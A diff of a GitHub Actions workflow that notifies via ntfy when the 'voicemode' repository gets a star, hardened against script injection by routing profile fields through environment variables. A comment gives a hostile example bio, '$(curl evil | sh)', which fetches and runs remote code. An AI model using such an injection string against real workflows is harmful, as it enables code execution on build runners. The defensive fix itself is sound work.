@@ -4,6 +4,9 @@ on:
   watch:
     types: [started]
 
+permissions:
+  contents: read
+
 jobs:
   notify:
     runs-on: ubuntu-latest
@@ -12,10 +15,11 @@ jobs:
         id: profile
         env:
           GH_TOKEN: ${{ github.token }}
+          ACTOR: ${{ github.actor }}
         run: |
           # Fetch user profile from GitHub API
           USER_DATA=$(curl -s -H "Authorization: token $GH_TOKEN" \
-            "https://api.github.com/users/${{ github.actor }}")
+            "https://api.github.com/users/$ACTOR")
 
           # Extract profile fields
           FOLLOWERS=$(echo "$USER_DATA" | jq -r '.followers // 0')
@@ -30,56 +34,70 @@ jobs:
           LOCATION=$(echo "$LOCATION" | tr '\n\r' '  ' | sed 's/[[:cntrl:]]//g')
 
           # Set outputs
-          echo "followers=$FOLLOWERS" >> $GITHUB_OUTPUT
-          echo "bio=$BIO" >> $GITHUB_OUTPUT
-          echo "company=$COMPANY" >> $GITHUB_OUTPUT
-          echo "location=$LOCATION" >> $GITHUB_OUTPUT
-          echo "public_repos=$PUBLIC_REPOS" >> $GITHUB_OUTPUT
+          echo "followers=$FOLLOWERS" >> "$GITHUB_OUTPUT"
+          echo "bio=$BIO" >> "$GITHUB_OUTPUT"
+          echo "company=$COMPANY" >> "$GITHUB_OUTPUT"
+          echo "location=$LOCATION" >> "$GITHUB_OUTPUT"
+          echo "public_repos=$PUBLIC_REPOS" >> "$GITHUB_OUTPUT"
 
           # Determine priority based on follower count
           if [ "$FOLLOWERS" -ge 500 ]; then
-            echo "priority=high" >> $GITHUB_OUTPUT
-            echo "tags=star,github,notable" >> $GITHUB_OUTPUT
+            echo "priority=high" >> "$GITHUB_OUTPUT"
+            echo "tags=star,github,notable" >> "$GITHUB_OUTPUT"
           elif [ "$FOLLOWERS" -ge 100 ]; then
-            echo "priority=default" >> $GITHUB_OUTPUT
-            echo "tags=star,github" >> $GITHUB_OUTPUT
+            echo "priority=default" >> "$GITHUB_OUTPUT"
+            echo "tags=star,github" >> "$GITHUB_OUTPUT"
           else
-            echo "priority=low" >> $GITHUB_OUTPUT
-            echo "tags=star,github" >> $GITHUB_OUTPUT
+            echo "priority=low" >> "$GITHUB_OUTPUT"
+            echo "tags=star,github" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Send ntfy notification
+        # Profile fields are attacker-controlled (anyone can star). They reach
+        # the shell only through env, never through ${{ }} inside run:, so a
+        # bio like $(curl evil | sh) stays a string.
+        env:
+          ACTOR: ${{ github.actor }}
+          FOLLOWERS: ${{ steps.profile.outputs.followers }}
+          PUBLIC_REPOS: ${{ steps.profile.outputs.public_repos }}
+          COMPANY: ${{ steps.profile.outputs.company }}
+          LOCATION: ${{ steps.profile.outputs.location }}
+          BIO: ${{ steps.profile.outputs.bio }}
+          PRIORITY: ${{ steps.profile.outputs.priority }}
+          TAGS: ${{ steps.profile.outputs.tags }}
+          STARGAZERS: ${{ github.event.repository.stargazers_count }}
+          NTFY_TOPIC: ${{ secrets.NTFY_TOPIC }}
         run: |
           # Build notification body with profile info
-          BODY="🎉 ${{ github.actor }} just starred voicemode!
+          BODY="🎉 $ACTOR just starred voicemode!
 
-          👥 Followers: ${{ steps.profile.outputs.followers }}
-          📦 Repos: ${{ steps.profile.outputs.public_repos }}"
+          👥 Followers: $FOLLOWERS
+          📦 Repos: $PUBLIC_REPOS"
 
           # Add optional fields if present
-          if [ -n "${{ steps.profile.outputs.company }}" ]; then
+          if [ -n "$COMPANY" ]; then
             BODY="$BODY
-          🏢 ${{ steps.profile.outputs.company }}"
+          🏢 $COMPANY"
           fi
 
-          if [ -n "${{ steps.profile.outputs.location }}" ]; then
+          if [ -n "$LOCATION" ]; then
             BODY="$BODY
-          📍 ${{ steps.profile.outputs.location }}"
+          📍 $LOCATION"
           fi
 
-          if [ "${{ steps.profile.outputs.bio }}" != "No bio" ]; then
+          if [ "$BIO" != "No bio" ]; then
             BODY="$BODY
 
-          💬 ${{ steps.profile.outputs.bio }}"
+          💬 $BIO"
           fi
 
           BODY="$BODY
 
-          ⭐ Total: ${{ github.event.repository.stargazers_count }}"
+          ⭐ Total: $STARGAZERS"
 
           curl -H "Title: VoiceMode ⭐ New Star!" \
-               -H "Priority: ${{ steps.profile.outputs.priority }}" \
-               -H "Tags: ${{ steps.profile.outputs.tags }}" \
-               -H "Click: https://github.com/${{ github.actor }}" \
+               -H "Priority: $PRIORITY" \
+               -H "Tags: $TAGS" \
+               -H "Click: https://github.com/$ACTOR" \
                -d "$BODY" \
-               https://ntfy.sh/${{ secrets.NTFY_TOPIC }}
+               "https://ntfy.sh/$NTFY_TOPIC"
